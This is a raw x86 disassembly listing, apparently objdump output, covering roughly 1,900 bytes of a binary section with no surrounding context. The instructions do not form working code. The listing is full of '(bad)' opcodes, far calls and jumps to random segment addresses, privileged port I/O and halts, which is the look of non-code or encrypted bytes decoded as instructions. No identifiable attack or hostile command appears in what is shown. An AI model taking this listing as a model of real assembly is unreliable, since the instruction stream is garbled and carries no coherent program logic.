  409c4c:	adc    ecx,DWORD PTR [ebx+0x10]
  409c4f:	test   al,0xfa
  409c51:	int3   
  409c52:	ins    DWORD PTR es:[edi],dx
  409c53:	les    eax,FWORD PTR [eax]
  409c55:	mov    esp,DWORD PTR [esi+0x4e]
  409c58:	mov    ch,0xb3
  409c5a:	sub    DWORD PTR [edi],esi
  409c5c:	inc    edi
  409c5d:	or     ebp,DWORD PTR [edi-0x110f4729]
  409c63:	mov    ah,0x69
  409c65:	sbb    BYTE PTR [edx-0x5358f042],0xf5
  409c6c:	test   eax,0x4d9ab4cb
  409c71:	mov    ds,WORD PTR [edx]
  409c73:	(bad)  
  409c74:	jo     0x409c71
  409c76:	loope  0x409c37
  409c78:	cmp    eax,0xf2159aef
  409c7d:	adc    dl,dl
  409c7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c80:	pop    eax
  409c81:	pop    edx
  409c82:	das    
  409c83:	push   ecx
  409c84:	cmp    DWORD PTR [esi+edx*8],edx
  409c87:	xor    eax,0x1855cb08
  409c8c:	or     ecx,DWORD PTR [ecx]
  409c8e:	shr    DWORD PTR [ebx-0x4e],1
  409c91:	cwde   
  409c92:	sub    ch,BYTE PTR [esi-0x2fb290cf]
  409c98:	icebp  
  409c99:	or     esp,esi
  409c9b:	cmp    bl,BYTE PTR [ebx]
  409c9d:	and    BYTE PTR [ecx-0x62b04720],bl
  409ca3:	scas   eax,DWORD PTR es:[edi]
  409ca4:	ror    BYTE PTR [edi+0x2ca2867b],0xc7
  409cab:	and    al,dl
  409cad:	or     edx,DWORD PTR [eax+0x50]
  409cb0:	sar    DWORD PTR [ecx+0x454984cd],cl
  409cb6:	call   0x732:0xff294155
  409cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cc0:	adc    edx,ebp
  409cc2:	jno    0x409c6e
  409cc4:	push   edx
  409cc5:	jne    0x409cf9
  409cc7:	jo     0x409c7b
  409cc9:	call   0x5ca40876
  409cce:	or     BYTE PTR [eax],cl
  409cd0:	adc    DWORD PTR ds:0x14cf3c2c,eax
  409cd6:	call   0xbb39:0x8bafd4be
  409cdd:	out    dx,eax
  409cde:	push   ebx
  409cdf:	call   0x92efa8d0
  409ce4:	xchg   ebx,eax
  409ce5:	mov    edx,0x8dd5ba6c
  409cea:	fwait
  409ceb:	jg     0x409c8f
  409ced:	loope  0x409cc2
  409cef:	xor    bh,BYTE PTR [edi+ebp*1-0x34a14dc4]
  409cf6:	lock xor DWORD PTR [ecx-0x5e],ebx
  409cfa:	in     al,dx
  409cfb:	out    dx,eax
  409cfc:	mov    bh,BYTE PTR [edi-0x66]
  409cff:	stos   BYTE PTR es:[edi],al
  409d00:	inc    edx
  409d01:	ins    DWORD PTR es:[edi],dx
  409d02:	or     BYTE PTR [ecx-0x9],ah
  409d05:	pop    esp
  409d06:	fwait
  409d07:	inc    esi
  409d08:	std    
  409d09:	sub    edx,DWORD PTR [edi]
  409d0b:	dec    ecx
  409d0c:	ret    0x5e21
  409d0f:	add    al,0xdd
  409d11:	or     edi,DWORD PTR [esi-0x5c]
  409d14:	call   0x9ac7:0x473acc9b
  409d1b:	xchg   ebx,eax
  409d1c:	xor    eax,0xb42ed5b6
  409d21:	(bad)  
  409d22:	neg    DWORD PTR [esi+0x699ff912]
  409d28:	fst    QWORD PTR [ecx+esi*2+0x8]
  409d2c:	mov    al,ds:0x7d1a9a4e
  409d31:	add    al,0x2e
  409d33:	dec    ebx
  409d34:	mov    eax,ds:0x90f1670b
  409d39:	sub    eax,0x6b23cff4
  409d3e:	fwait
  409d3f:	dec    ebp
  409d40:	inc    esi
  409d41:	mov    bh,0x47
  409d43:	sti    
  409d44:	jae    0x409d75
  409d46:	jb     0x409d82
  409d48:	out    0xe,eax
  409d4a:	stos   BYTE PTR es:[edi],al
  409d4b:	or     bh,BYTE PTR [edi+0x6b27f051]
  409d51:	aad    0x26
  409d53:	add    bh,BYTE PTR [eax+0x67459074]
  409d59:	mov    esi,0xaaf79d
  409d5e:	gs push es
  409d60:	inc    edi
  409d61:	cmp    edi,DWORD PTR [ebp+0x7d676291]
  409d67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d68:	inc    eax
  409d69:	ss xchg esp,eax
  409d6b:	and    DWORD PTR [ecx+ecx*4],ebx
  409d6e:	jp     0x409d29
  409d70:	add    DWORD PTR [ecx],0xba31dc98
  409d76:	hlt    
  409d77:	mov    edx,0xe9fa7406
  409d7c:	mov    esp,0x74699a4b
  409d81:	xchg   esp,eax
  409d82:	jno    0x409d69
  409d84:	lock movs DWORD PTR es:[edi],DWORD PTR ss:[esi]
  409d87:	fnsave [edi-0x1b]
  409d8a:	retf   0xfda8
  409d8d:	sbb    dh,BYTE PTR [ebp-0x47]
  409d90:	push   eax
  409d91:	xchg   BYTE PTR [edi+0x22],ah
  409d94:	repnz and DWORD PTR [ecx-0x5b68b3f0],ebx
  409d9b:	add    ch,BYTE PTR [esi+0xb]
  409d9e:	fcmovnbe st,st(6)
  409da0:	jbe    0x409d59
  409da2:	stos   BYTE PTR es:[edi],al
  409da3:	dec    esp
  409da4:	jmp    0xdf7e65ae
  409da9:	mov    dh,0x7a
  409dab:	mov    bl,0x21
  409dad:	int3   
  409dae:	mov    esi,0xca0ab230
  409db3:	cmp    edx,ecx
  409db5:	jmp    0x6013:0x5a4e24c0
  409dbc:	push   edx
  409dbd:	add    al,0xe3
  409dbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dc0:	ins    DWORD PTR es:[edi],dx
  409dc1:	jne    0x409def
  409dc3:	lods   eax,DWORD PTR ds:[esi]
  409dc4:	loope  0x409e44
  409dc6:	fs dec esp
  409dc8:	jb     0x409d69
  409dca:	hlt    
  409dcb:	lods   al,BYTE PTR ds:[esi]
  409dcc:	mov    al,0xe7
  409dce:	mov    ds:0xc6d8e7a4,eax
  409dd3:	inc    ebx
  409dd4:	test   al,0x71
  409dd6:	and    dh,BYTE PTR [edi-0x3b6569ab]
  409ddc:	jno    0x409e4a
  409dde:	stos   BYTE PTR es:[edi],al
  409ddf:	(bad)
  409de2:	lods   eax,DWORD PTR ds:[esi]
  409de3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409de4:	es pop ss
  409de6:	pop    esi
  409de7:	adc    BYTE PTR [ebp+0x7c],dh
  409dea:	imul   esi,DWORD PTR ds:0x4f6d2db3,0x7f718563
  409df4:	jae    0x409dda
  409df6:	push   esi
  409df7:	ror    DWORD PTR ds:0x328c7f32,cl
  409dfd:	ja     0x409d83
  409dff:	adc    eax,0xc9618978
  409e04:	mov    dl,0xa8
  409e06:	out    0xbf,eax
  409e08:	adc    esi,DWORD PTR [ebx+0xb5ee100]
  409e0e:	(bad)  
  409e0f:	xor    ebp,DWORD PTR [eax+0x45]
  409e12:	mov    dh,0xf0
  409e14:	cli    
  409e15:	cmp    ebx,DWORD PTR [edx-0x11a5b3cf]
  409e1b:	call   0x1ef3:0xa4fb93b8
  409e22:	ja     0x409e30
  409e24:	mov    ebx,0x51b532db
  409e29:	jge    0x409dc5
  409e2b:	test   al,0xa3
  409e2d:	cmp    ah,dh
  409e2f:	push   eax
  409e30:	test   DWORD PTR [edx+0x781ba8e7],esi
  409e36:	adc    BYTE PTR [ebx-0x1e5eae0e],dh
  409e3c:	cmp    DWORD PTR [esi+0x12b57a9a],esi
  409e42:	ins    DWORD PTR es:[edi],dx
  409e43:	and    al,0x5a
  409e45:	sahf   
  409e46:	mov    esp,0xba4070a7
  409e4b:	and    ebp,DWORD PTR [eax+0x63]
  409e4e:	fadd   QWORD PTR [edx+esi*4]
  409e51:	xchg   ebx,eax
  409e52:	popf   
  409e53:	cld    
  409e54:	pop    ds
  409e55:	mov    esi,0xb1dcbb9
  409e5a:	imul   eax,ecx,0xf15a9186
  409e60:	popf   
  409e61:	ja     0x409e4d
  409e63:	jae    0x409e17
  409e65:	sub    eax,0xe1a302b
  409e6a:	popf   
  409e6b:	jb     0x409def
  409e6d:	or     eax,DWORD PTR [edi]
  409e6f:	or     ebx,eax
  409e71:	xchg   edi,eax
  409e72:	dec    eax
  409e73:	(bad)  
  409e75:	mov    WORD PTR [ecx-0x385e31d9],ds
  409e7b:	cmc    
  409e7c:	stc    
  409e7d:	mov    ebx,0x17ec1f36
  409e82:	pop    eax
  409e83:	mov    dh,0xd3
  409e85:	jae    0x409e21
  409e87:	adc    esi,DWORD PTR [esi]
  409e89:	pop    esi
  409e8a:	out    0xe5,eax
  409e8c:	inc    ebx
  409e8d:	add    ebx,DWORD PTR [edx+0x6f956897]
  409e93:	mov    esp,0xa7b4da2f
  409e98:	rcl    BYTE PTR [edx-0x5eeff7e5],1
  409e9e:	mov    ch,0xd1
  409ea0:	mov    esp,0xcdc2267b
  409ea5:	push   esp
  409ea6:	pop    edx
  409ea7:	xchg   edx,eax
  409ea8:	push   ebp
  409ea9:	inc    ebx
  409eaa:	dec    edi
  409eab:	cld    
  409eac:	xor    cl,BYTE PTR [ebx]
  409eae:	fwait
  409eaf:	mov    ah,0x92
  409eb1:	in     al,0x4d
  409eb3:	push   ds
  409eb4:	mov    DWORD PTR [edx-0x1d],ebp
  409eb7:	push   edi
  409eb8:	mov    dl,0xe3
  409eba:	js     0x409eb6
  409ebc:	jbe    0x409e8c
  409ebe:	shr    DWORD PTR [edi-0x46],cl
  409ec1:	jge    0x409e46
  409ec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ec4:	test   edi,esp
  409ec6:	mov    esi,0xc24b5f9
  409ecb:	jae    0x409e68
  409ecd:	push   edi
  409ece:	call   0x1f4d:0x8e2be016
  409ed5:	pop    es
  409ed6:	das    
  409ed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ed8:	adc    DWORD PTR [eax-0x1a461755],ecx
  409ede:	or     BYTE PTR [eax],bh
  409ee0:	shl    al,1
  409ee2:	adc    edi,DWORD PTR [esi-0x19]
  409ee5:	or     eax,DWORD PTR [ebp-0x15]
  409ee8:	and    al,bl
  409eea:	mov    bh,BYTE PTR [ecx+0x26d7daae]
  409ef0:	xchg   esp,eax
  409ef1:	adc    eax,0xfb15d7be
  409ef6:	dec    edi
  409ef7:	mov    dl,0xb2
  409ef9:	adc    ebp,DWORD PTR [ebx-0x3ed485]
  409eff:	mov    bl,0xb5
  409f01:	xchg   ebx,eax
  409f02:	push   es
  409f03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f04:	mov    ds:0xa9446c7d,al
  409f09:	out    0x88,al
  409f0b:	xor    eax,0x259739b2
  409f10:	pop    ebp
  409f11:	pop    ss
  409f12:	mov    WORD PTR [eax],cs
  409f14:	or     al,0x8
  409f16:	and    DWORD PTR [ebx-0x5],edi
  409f19:	push   0xffffffad
  409f1b:	test   BYTE PTR [edx-0x2f],dh
  409f1e:	pop    ecx
  409f1f:	(bad)  
  409f20:	mov    dl,0x90
  409f22:	cmp    ah,BYTE PTR [ebp+0x305ba04b]
  409f28:	imul   eax,DWORD PTR [ecx+ebx*1],0xffffff9a
  409f2c:	dec    ecx
  409f2d:	icebp  
  409f2e:	mov    edx,0x270e99ab
  409f33:	sub    cl,cl
  409f35:	stos   DWORD PTR es:[edi],eax
  409f36:	test   BYTE PTR [eax+0x4e],bl
  409f39:	lods   eax,DWORD PTR ds:[esi]
  409f3a:	gs daa 
  409f3c:	inc    eax
  409f3d:	adc    al,0x78
  409f3f:	data16 mov BYTE PTR [ecx+ecx*1+0x37],ch
  409f44:	popa   
  409f45:	ja     0x409f8d
  409f47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f48:	xor    eax,0xc16f7674
  409f4d:	push   ebx
  409f4e:	or     esp,DWORD PTR [edx+0x524a7fb2]
  409f54:	fiadd  DWORD PTR [ecx-0x15]
  409f57:	xchg   DWORD PTR [eax],ebx
  409f59:	or     ebx,edx
  409f5b:	in     al,0x32
  409f5d:	cli    
  409f5e:	pop    ds
  409f5f:	adc    ah,dh
  409f61:	int3   
  409f62:	mov    ds:0x770b9849,al
  409f67:	xor    ah,BYTE PTR [ebx]
  409f69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f6a:	call   0x8137af87
  409f6f:	mov    al,ds:0x51268f51
  409f74:	fnstcw WORD PTR [ebx]
  409f76:	jae    0x409fc2
  409f78:	pop    eax
  409f79:	ss ins DWORD PTR es:[edi],dx
  409f7b:	(bad)  
  409f7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f7d:	call   0x67d9:0xc51c2d94
  409f84:	scas   eax,DWORD PTR es:[edi]
  409f85:	or     eax,0xac9e7b
  409f8a:	int    0x40
  409f8c:	add    bl,0x1b
  409f8f:	in     al,0x64
  409f91:	aad    0x8a
  409f93:	(bad)  
  409f94:	adc    edi,DWORD PTR [esi-0x6c]
  409f97:	es pop esi
  409f99:	sti    
  409f9a:	mov    ecx,0xddff4067
  409f9f:	ja     0x409fa2
  409fa1:	or     bh,BYTE PTR [eax-0x1a99af6e]
  409fa7:	inc    ecx
  409fa8:	inc    ecx
  409fa9:	fiadd  DWORD PTR [edi-0x658c9695]
  409faf:	push   edi
  409fb0:	cs pop eax
  409fb2:	add    ecx,DWORD PTR [eax]
  409fb4:	aad    0xf9
  409fb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fb8:	xchg   ecx,eax
  409fb9:	jbe    0x409ff1
  409fbb:	jb     0x40a02b
  409fbd:	and    al,0x93
  409fbf:	jle    0x409f73
  409fc1:	jl     0x409fd0
  409fc3:	push   es
  409fc4:	int3   
  409fc5:	cli    
  409fc6:	int3   
  409fc7:	sti    
  409fc8:	int    0x8
  409fca:	inc    ebp
  409fcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fcc:	mov    cs,WORD PTR [edx-0x24]
  409fcf:	cmp    edx,DWORD PTR [edx]
  409fd1:	and    ebp,DWORD PTR ds:0xf048b229
  409fd7:	or     BYTE PTR [ebp+0x5f],0x7d
  409fdb:	jecxz  0x409fcc
  409fdd:	adc    eax,0x8b1fde5a
  409fe2:	sahf   
  409fe3:	in     eax,0x52
  409fe5:	idiv   BYTE PTR [esi+0x607b3aa]
  409feb:	popf   
  409fec:	and    DWORD PTR [ecx],ecx
  409fee:	outs   dx,DWORD PTR ds:[esi]
  409fef:	out    0x6b,al
  409ff1:	test   eax,0xa06a8fa
  409ff6:	or     eax,0x563e4102
  409ffb:	pusha  
  409ffc:	fdivr  QWORD PTR [edx]
  409ffe:	push   eax
  409fff:	dec    ebx
  40a000:	rcl    DWORD PTR ds:0x196fda9b,0x5e
  40a007:	sti    
  40a008:	out    dx,eax
  40a009:	mov    bl,0xba
  40a00b:	loopne 0x40a059
  40a00d:	stos   DWORD PTR es:[edi],eax
  40a00e:	pop    es
  40a00f:	in     eax,0x3f
  40a011:	add    eax,0xdc3bbf1e
  40a016:	mov    edx,0x4a2508ea
  40a01b:	shl    DWORD PTR [edx+0x387370c8],0x65
  40a022:	fst    DWORD PTR [edi+0x7a]
  40a025:	or     al,bh
  40a027:	loopne 0x40a041
  40a029:	ds jecxz 0x40a044
  40a02c:	shl    BYTE PTR [ebp-0x66],0x84
  40a030:	test   al,0x5f
  40a032:	xchg   edi,eax
  40a033:	xchg   edi,eax
  40a034:	iret   
  40a035:	pop    ecx
  40a036:	iret   
  40a037:	mov    ebx,0xe750345f
  40a03c:	stos   BYTE PTR es:[edi],al
  40a03d:	add    DWORD PTR [edi-0x6523e1a1],0x3ccef760
  40a047:	retf   0x1786
  40a04a:	mov    ah,0xa7
  40a04c:	out    dx,eax
  40a04d:	cs sbb al,0xf6
  40a050:	push   ecx
  40a051:	cmp    bl,BYTE PTR [eax-0x2dc94e21]
  40a057:	adc    ah,al
  40a059:	mul    ebp
  40a05b:	ins    BYTE PTR es:[edi],dx
  40a05c:	xor    bl,ch
  40a05e:	ss sahf 
  40a060:	fwait
  40a061:	or     edi,DWORD PTR [ebp-0x52df38d4]
  40a067:	sbb    dl,BYTE PTR [ebx]
  40a069:	xchg   ecx,eax
  40a06a:	call   0x7727:0x53ab6c6f
  40a071:	jnp    0x40a00e
  40a073:	fistp  QWORD PTR [edi]
  40a075:	or     esp,DWORD PTR [edx+0x4f]
  40a078:	inc    ebx
  40a079:	test   DWORD PTR [ebp-0x658fee21],0xa9c741fc
  40a083:	mov    eax,ds:0xa0c43e5f
  40a088:	jp     0x40a037
  40a08a:	jb     0x40a039
  40a08c:	lods   al,BYTE PTR ds:[esi]
  40a08d:	xor    DWORD PTR [eax],ecx
  40a08f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a090:	retf   
  40a091:	and    DWORD PTR [ecx-0x6305a565],0xffffff98
  40a098:	dec    esi
  40a099:	cmp    al,0x68
  40a09b:	add    esi,DWORD PTR [edx+0x352dc81d]
  40a0a1:	jne    0x40a09f
  40a0a3:	sub    al,0x52
  40a0a5:	jmp    0xb4ed7b9
  40a0aa:	shl    DWORD PTR [ecx+0x6a],1
  40a0ad:	fsubr  QWORD PTR [ebx]
  40a0af:	sbb    BYTE PTR [eax],bh
  40a0b1:	aad    0x9a
  40a0b3:	sbb    eax,0xa212796d
  40a0b8:	nop
  40a0b9:	mov    BYTE PTR [esi+0x6bfedba7],cl
  40a0bf:	xchg   ebp,eax
  40a0c0:	or     dh,BYTE PTR [ebx-0x7e]
  40a0c3:	sub    DWORD PTR [edx+0x418716e5],esi
  40a0c9:	shr    DWORD PTR [edx+0x46],cl
  40a0cc:	out    dx,eax
  40a0cd:	or     edx,ebp
  40a0cf:	mov    ds:0xb7a8e38e,eax
  40a0d4:	aas    
  40a0d5:	inc    eax
  40a0d6:	call   0xb081:0x1d8dde4c
  40a0dd:	sub    al,0x36
  40a0df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0e0:	popf   
  40a0e1:	loop   0x40a064
  40a0e3:	nop
  40a0e4:	les    ebx,FWORD PTR ds:0xcb21baa
  40a0ea:	lods   al,BYTE PTR ds:[esi]
  40a0eb:	jl     0x40a0a7
  40a0ed:	inc    ecx
  40a0ee:	cmp    ecx,DWORD PTR [ecx]
  40a0f0:	jns    0x40a0fe
  40a0f2:	cs adc dl,dh
  40a0f5:	lods   al,BYTE PTR ds:[esi]
  40a0f6:	and    BYTE PTR [edi-0x64ce9801],al
  40a0fc:	mov    dl,0x83
  40a0fe:	(bad)  
  40a100:	jbe    0x40a147
  40a102:	mov    al,0xbb
  40a104:	ss or  edi,ecx
  40a107:	dec    ebx
  40a108:	push   ebp
  40a109:	int    0x54
  40a10b:	mov    ah,0xf3
  40a10d:	push   eax
  40a10e:	call   0xed10:0xddbd8f73
  40a115:	jno    0x40a0fd
  40a117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a118:	lahf   
  40a119:	jmp    0x40a123
  40a11b:	icebp  
  40a11c:	mov    edi,0x22f9133d
  40a121:	xchg   edi,eax
  40a122:	call   0x6c6c:0xcb64f44b
  40a129:	fsub   DWORD PTR [edi+0x1cad09a7]
  40a12f:	pop    ds
  40a130:	ja     0x40a104
  40a132:	std    
  40a133:	xor    eax,0xf9a8acb
  40a138:	inc    esp
  40a139:	xor    cl,dh
  40a13b:	(bad)  
  40a13d:	push   edi
  40a13e:	outs   dx,DWORD PTR ds:[esi]
  40a13f:	test   al,0x6f
  40a141:	stc    
  40a142:	cwde   
  40a143:	aad    0xd7
  40a145:	push   ds
  40a146:	dec    edx
  40a147:	es pop ecx
  40a149:	jle    0x40a199
  40a14b:	xchg   edi,eax
  40a14c:	into   
  40a14d:	rcr    DWORD PTR [edx+0x653f45a9],cl
  40a153:	sbb    ebx,esi
  40a155:	or     al,ah
  40a157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a158:	hlt    
  40a159:	into   
  40a15a:	pop    ecx
  40a15b:	sub    ch,BYTE PTR [ebx-0x26]
  40a15e:	mov    al,ds:0x2a15b39a
  40a163:	mov    al,ds:0xe9731ba3
  40a168:	dec    esi
  40a169:	mov    cl,0xc
  40a16b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a16c:	mov    esi,0x2eec52db
  40a171:	shl    DWORD PTR [edi-0x1257521c],0x65
  40a178:	xor    dl,dl
  40a17a:	inc    eax
  40a17b:	fadd   QWORD PTR [ecx-0x452a704a]
  40a181:	or     edx,DWORD PTR ds:0x68de8d15
  40a187:	dec    eax
  40a188:	pop    es
  40a189:	push   edx
  40a18a:	call   0xde93:0x12d0ace7
  40a191:	jns    0x40a199
  40a193:	mov    al,0x94
  40a195:	xor    ebx,edi
  40a197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a198:	loopne 0x40a12a
  40a19a:	lods   al,BYTE PTR ds:[esi]
  40a19b:	out    dx,al
  40a19c:	push   ebp
  40a19d:	jnp    0x40a1f3
  40a19f:	jl     0x40a153
  40a1a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1a2:	push   ebx
  40a1a3:	mov    bh,0x56
  40a1a5:	aam    0x4f
  40a1a7:	xchg   BYTE PTR [ebp-0x2597ceec],ah
  40a1ad:	ret    0x38e
  40a1b0:	xor    ah,BYTE PTR [eax-0x4dc62526]
  40a1b6:	call   0xfe90:0xe1faeea4
  40a1bd:	xchg   edi,ebx
  40a1bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1c0:	add    eax,0x18173223
  40a1c5:	mov    ecx,DWORD PTR [edx]
  40a1c7:	gs mov dl,0x16
  40a1ca:	test   al,0xa8
  40a1cc:	push   esi
  40a1cd:	pop    edi
  40a1ce:	dec    esi
  40a1cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1d0:	rcr    DWORD PTR ds:0xbb79c96,0x84
  40a1d7:	push   0x86424d2f
  40a1dc:	mov    dl,0x5e
  40a1de:	sub    BYTE PTR [edx],bl
  40a1e0:	push   es
  40a1e1:	mov    ebx,0xbdceb1a
  40a1e6:	dec    edx
  40a1e7:	and    BYTE PTR [eax+0x68c4d770],0x77
  40a1ee:	mov    BYTE PTR [edx-0x69],ah
  40a1f1:	sub    bl,BYTE PTR [edx-0x30c41ef6]
  40a1f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1f8:	xor    DWORD PTR [esi-0x1576c866],0xabc18586
  40a202:	call   0x9337:0xf90e4bc5
  40a209:	fdiv   QWORD PTR [eax]
  40a20b:	ficomp DWORD PTR [edi+0xb]
  40a20e:	les    edx,FWORD PTR ds:0x9f73eb57
  40a214:	cmc    
  40a215:	mov    dh,0x9a
  40a217:	mov    eax,ds:0x3e370f76
  40a21c:	mov    ecx,gs
  40a21e:	xchg   BYTE PTR [edi+0x33f55882],ah
  40a224:	(bad)  
  40a225:	xor    DWORD PTR [edi+0x6812b25e],ebx
  40a22b:	cld    
  40a22c:	int3   
  40a22d:	popa   
  40a22e:	ss out 0x1b,eax
  40a231:	or     eax,DWORD PTR [edi]
  40a233:	push   0x3793fc91
  40a238:	shr    BYTE PTR [ecx+0xe6280c2],cl
  40a23e:	hlt    
  40a23f:	pop    edx
  40a240:	leave  
  40a241:	pop    edx
  40a242:	pop    edx
  40a243:	rcr    BYTE PTR [edi+ecx*4-0x3f],cl
  40a247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a248:	clc    
  40a249:	sub    BYTE PTR [eax-0x1a],0x2f
  40a24d:	test   eax,0xf4b289e7
  40a252:	sti    
  40a253:	sbb    bh,BYTE PTR [esi]
  40a255:	mov    BYTE PTR ds:0xb30bf952,al
  40a25b:	xor    edx,esi
  40a25d:	ja     0x40a261
  40a25f:	and    DWORD PTR ds:0x8cd56a34,ebx
  40a265:	add    DWORD PTR [edi+0x54b362a7],edx
  40a26b:	add    esp,esi
  40a26d:	sbb    DWORD PTR [esi-0x653dfb15],esi
  40a273:	sbb    dh,BYTE PTR [ecx+esi*2+0x66]
  40a277:	push   ebp
  40a278:	js     0x40a265
  40a27a:	call   0x84a4:0x98bb578d
  40a281:	jbe    0x40a24e
  40a283:	test   eax,0xac64d3b6
  40a288:	push   edx
  40a289:	and    DWORD PTR [edx],0x9ae718fc
  40a28f:	xlat   BYTE PTR ds:[ebx]
  40a290:	dec    esi
  40a291:	mov    edx,0xd2460a2d
  40a296:	adc    eax,0x636d83a7
  40a29b:	sbb    ecx,edx
  40a29d:	test   DWORD PTR [edx+0x490fb236],ebp
  40a2a3:	dec    eax
  40a2a4:	aad    0xa4
  40a2a6:	xlat   BYTE PTR ds:[ebx]
  40a2a7:	or     esi,DWORD PTR [edi+0x7091a20b]
  40a2ad:	sub    bh,al
  40a2af:	add    eax,0x289b23e0
  40a2b4:	jl     0x40a267
  40a2b6:	je     0x40a291
  40a2b8:	cmp    ch,BYTE PTR [ecx]
  40a2ba:	jb     0x40a2f0
  40a2bc:	ja     0x40a2bb
  40a2be:	adc    esp,DWORD PTR [edi-0x4430bba1]
  40a2c4:	mov    edi,0x8d65a532
  40a2c9:	les    edi,FWORD PTR [edi+0x49750727]
  40a2cf:	jg     0x40a307
  40a2d1:	jg     0x40a321
  40a2d3:	test   al,0x9f
  40a2d5:	ficom  DWORD PTR [edi]
  40a2d7:	shr    BYTE PTR [esi],0xb
  40a2da:	jg     0x40a2f0
  40a2dc:	call   0xeead4dc5
  40a2e1:	nop
  40a2e2:	pop    ss
  40a2e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2e4:	sub    eax,0x77d5c899
  40a2e9:	fldenv [ecx-0x24b2ba59]
  40a2ef:	adc    DWORD PTR [esp+edx*8],edx
  40a2f2:	inc    edi
  40a2f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2f4:	xchg   esp,eax
  40a2f5:	mov    ecx,DWORD PTR [ecx]
  40a2f7:	hlt    
  40a2f8:	mov    ecx,0x8da7a50a
  40a2fd:	push   ds
  40a2fe:	fnstenv [edi+0x44f50b43]
  40a304:	repz jge 0x40a299
  40a307:	push   0xcb902249
  40a30c:	jae    0x40a2bd
  40a30e:	xor    BYTE PTR [edi-0x4e],bl
  40a311:	ja     0x40a2ae
  40a313:	mov    dl,0x6
  40a315:	div    DWORD PTR ds:0xb1e9ac55
  40a31b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a31c:	jmp    0x40a310
  40a31e:	sahf   
  40a31f:	push   edx
  40a320:	aam    0xf5
  40a322:	jge    0x40a2eb
  40a324:	mov    dl,0x6a
  40a326:	jmp    0xad36:0xd267568e
  40a32d:	or     ebp,ebx
  40a32f:	rep stos DWORD PTR es:[edi],eax
  40a331:	cmp    ecx,DWORD PTR [esi]
  40a333:	jb     0x40a2ee
  40a335:	(bad)  
  40a336:	call   0xdf03:0x76bb0e82
  40a33d:	jo     0x40a360
  40a33f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a340:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a341:	les    ebp,FWORD PTR [edi]
  40a343:	mov    edx,0x55fe273a
  40a348:	mov    dl,0xb9
  40a34a:	hlt    
  40a34b:	mov    ds:0x4c4b2857,al
  40a350:	xor    DWORD PTR [ebx+0x5368ae6c],esi
  40a356:	adc    BYTE PTR [ebx+esi*4],ch
  40a359:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a35a:	xlat   BYTE PTR ds:[ebx]
  40a35b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a35c:	mov    ds:0xb35ecac3,eax
  40a361:	xchg   ebp,eax
  40a362:	scas   al,BYTE PTR es:[edi]
  40a363:	mov    esp,0xacf5633e
  40a368:	data16 cmc 
  40a36a:	sbb    ah,BYTE PTR [edi+0x758266bc]
  40a370:	xchg   esi,eax
  40a371:	push   ebx
  40a372:	ror    DWORD PTR [ebx-0x6],0xc8
  40a376:	fld    TBYTE PTR [ecx-0x389f6261]
  40a37c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a37d:	sub    BYTE PTR [eax-0x28fb8b0e],ch
  40a383:	popf   
  40a384:	mov    ds:0x7d385a3b,eax
  40a389:	mov    eax,ds:0x21b26769
  40a38e:	in     eax,dx
  40a38f:	in     eax,dx
  40a390:	lods   al,BYTE PTR ds:[esi]
  40a391:	dec    edx
  40a392:	bound  ecx,QWORD PTR [edx+0x9]
  40a395:	or     cl,ah
  40a397:	or     ecx,DWORD PTR [ecx-0x456ad187]
  40a39d:	cmp    eax,esp
  40a39f:	or     eax,0xf3b45bad
  40a3a4:	xor    bh,cl
  40a3a6:	les    ecx,FWORD PTR [eax]
  40a3a8:	inc    esp
  40a3a9:	adc    al,BYTE PTR [edi-0x7b62aa5c]
  40a3af:	hlt    
  40a3b0:	cmc    
  40a3b1:	push   ebx
  40a3b2:	sbb    bh,BYTE PTR [eax-0x75]
  40a3b5:	call   0xa73d:0x178a0c0a
  40a3bc:	mov    al,ds:0xc018549e
  40a3c1:	mov    ch,0xe7
  40a3c3:	scas   al,BYTE PTR es:[edi]
  40a3c4:	int3   
  40a3c5:	ret    0x5a21
  40a3c8:	xor    bl,al
  40a3ca:	aad    0x6f
  40a3cc:	sub    al,0x71
  40a3ce:	xchg   ecx,eax
  40a3cf:	add    edi,edx
  40a3d1:	add    dh,BYTE PTR [edx-0x5464ab59]
  40a3d7:	nop
  40a3d8:	pop    ss
  40a3d9:	or     ebx,DWORD PTR [esi+edx*1]
  40a3dc:	scas   eax,DWORD PTR es:[edi]
